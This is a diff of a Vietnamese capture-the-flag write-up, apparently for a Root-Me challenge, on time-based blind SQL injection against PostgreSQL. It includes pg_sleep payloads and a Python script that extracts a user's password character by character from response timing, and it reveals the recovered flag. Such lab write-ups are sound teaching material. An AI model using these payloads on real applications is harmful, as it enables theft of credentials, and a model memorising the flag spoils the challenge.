@@ -64,3 +64,33 @@ Vậy tìm được tên column ở hàng thứ 5 là password với tên bảng
 > payload: 1;+select+case+when+((select length(password) from users+limit+1)>1)+then+pg_sleep(20)+else+pg_sleep(0)+end+--
 
 Thử như vậy ta được length của password hàng 1 có độ dài là 13
+
+Nhưng bằng cách trên mình thấy bruteforce bằng burpsuite khá lâu, nên ta có thể tham khảo script sau sẽ nhanh hơn: 
+
+```
+import urllib, time
+import http.client as httplib
+import re
+
+for y in range(1,14):	
+	for x in range(33,127):
+		headers = {'Accept':'text/html','cookie':'PHPSESSID=------------------'}
+
+		conn = httplib.HTTPConnection("challenge01.root-me.org")
+		conn.request("GET","/web-serveur/ch40/?action=member&member=1;select+case+when+substr((select+password+from+users+limit+1+offset+0),"+str(y)+",1)=chr("+str(x)+")+then+pg_sleep(5)+else+pg_sleep(0)+end--",'',headers)
+		start=time.time()
+		response = conn.getresponse()
+		end=time.time()
+	
+		if end-start > 2 :
+			print("count: ", y)
+			print ("x : ", x)
+			break
+conn.close()
+
+```
+
+Ta chuyển đổi về dạng char về text thì được : T!m3B@s3DSQL!
+
+![image](https://user-images.githubusercontent.com/104350480/221489365-0311d5b6-3ff9-4e4c-868a-cd2da2142d93.png)
+
